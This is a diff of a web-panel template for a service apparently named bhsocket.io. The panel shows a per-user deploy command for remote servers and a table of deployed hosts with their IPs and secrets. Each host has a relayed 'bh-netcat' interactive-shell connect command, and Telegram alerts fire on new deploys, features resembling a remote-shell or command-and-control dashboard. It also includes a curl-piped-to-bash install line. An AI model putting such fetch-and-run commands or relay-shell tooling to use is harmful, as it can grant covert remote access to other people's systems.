+<section class="panel"><h1>Register</h1><p class="muted">Create an employee account. Your deploy token will be generated automatically.</p><form method="post" action="/panel/register"><label>Username<input name="username" autocomplete="username" required></label><label>Password<input name="password" type="password" autocomplete="new-password" minlength="8" required></label><button class="primary">Create account</button></form></section>
 </div>
 {{else}}
-<section class="panel">
-<h1>Your servers</h1>
-<div class="metric"><div><span class="muted">Servers</span><b>{{len .Servers}}</b></div><div><span class="muted">Deploy Token</span><b>Active</b></div><div><span class="muted">Relay</span><b>bhsocket.io</b></div></div>
-</section>
-<section class="panel">
-<h2>Your deploy command</h2>
-<p class="muted">Run this on each remote server. Every deploy with this token appears only in your panel.</p>
-<div class="cmd" data-copy="{{.DeployCommand}}"><button class="copy" type="button">Copy</button><pre>{{.DeployCommand}}</pre></div>
-<form method="post" action="/panel/token/rotate" style="margin-top:12px"><button>Rotate deploy token</button></form>
-</section>
-<section class="panel">
-<h2>Server list</h2>
-<div style="overflow:auto"><table><thead><tr><th>Server</th><th>User</th><th>IP</th><th>Secret</th><th>Connect</th><th>Last deploy</th></tr></thead><tbody>
-{{range .Servers}}
-<tr><td><strong>{{.Hostname}}</strong><div class="muted">{{.OS}} {{.Arch}}</div><code>{{.InstallPath}}</code></td><td>{{.ServerUser}}</td><td><code>{{if .PublicIP}}{{.PublicIP}}{{else}}{{.IP}}{{end}}</code></td><td class="secret"><code>{{.Secret}}</code></td><td><div class="cmd" data-copy="bh-netcat -s &quot;{{.Secret}}&quot; -i"><button class="copy" type="button">Copy</button><pre>bh-netcat -s "{{.Secret}}" -i</pre></div></td><td>{{.Time.Format "2006-01-02 15:04:05"}}</td></tr>
-{{else}}<tr><td colspan="6" class="muted">No servers yet. Run your deploy command on a server.</td></tr>{{end}}
-</tbody></table></div>
-</section>
+<section class="panel"><div class="section-title"><div><h1>Your servers</h1><p class="muted">Deploy with your token, then connect using the saved secret from this dashboard.</p></div><span class="pill">Relay bhsocket.io</span></div><div class="metric"><div><span>Servers</span><b>{{len .Servers}}</b></div><div><span>Deploy Token</span><b>Active</b></div><div><span>Telegram</span><b>{{if and .User.TelegramBotToken .User.TelegramChatID}}On{{else}}Off{{end}}</b></div></div></section>
+<div class="dashboard-grid">
+<section class="panel"><h2>Your deploy command</h2><p class="muted">Run this on each remote server. Every deploy with this token appears only in your panel.</p><div class="cmd" data-copy="{{.DeployCommand}}"><button class="copy" type="button">Copy</button><pre>{{.DeployCommand}}</pre></div><form method="post" action="/panel/token/rotate" style="margin-top:12px"><button>Rotate deploy token</button></form></section>
+<section class="panel"><h2>Quick connect</h2><p class="muted">Install bh-netcat locally once, then copy a server connect command from the table.</p><div class="cmd" data-copy='bash -c "$(curl -fsSL https://bhsocket.io/install)"'><button class="copy" type="button">Copy</button><pre>bash -c "$(curl -fsSL https://bhsocket.io/install)"</pre></div></section>
+</div>
+<section class="panel"><h2>Server list</h2><div style="overflow:auto"><table><thead><tr><th>Server</th><th>User</th><th>IP</th><th>Secret</th><th>Connect</th><th>Last deploy</th></tr></thead><tbody>{{range .Servers}}<tr><td><strong>{{.Hostname}}</strong><div class="muted">{{.OS}} {{.Arch}} {{.Kernel}}</div><code>{{.InstallPath}}</code></td><td>{{.ServerUser}}</td><td><code>{{if .PublicIP}}{{.PublicIP}}{{else}}{{.IP}}{{end}}</code></td><td class="secret"><code>{{.Secret}}</code></td><td><div class="cmd" data-copy="bh-netcat -s &quot;{{.Secret}}&quot; -i"><button class="copy" type="button">Copy</button><pre>bh-netcat -s "{{.Secret}}" -i</pre></div></td><td>{{.Time.Format "2006-01-02 15:04:05"}}</td></tr>{{else}}<tr><td colspan="6"><div class="server-empty">No servers yet. Run your deploy command on a server.</div></td></tr>{{end}}</tbody></table></div></section>
+<div class="settings-grid">
+<section class="panel"><h2>Change password</h2><form method="post" action="/panel/password"><label>Current password<input name="current_password" type="password" autocomplete="current-password" required></label><label>New password<input name="new_password" type="password" autocomplete="new-password" minlength="8" required></label><button>Update password</button></form></section>
+<section class="panel"><h2>Telegram notifications</h2><p class="muted">Send a message when a new server is deployed with your token.</p><form method="post" action="/panel/telegram"><label>Bot token<input name="telegram_bot_token" value="{{.User.TelegramBotToken}}" placeholder="123456:ABC..." autocomplete="off"></label><label>Chat ID<input name="telegram_chat_id" value="{{.User.TelegramChatID}}" placeholder="123456789" autocomplete="off"></label><button>Save Telegram settings</button></form></section>
+</div>
 {{end}}
 </main>
 <script>
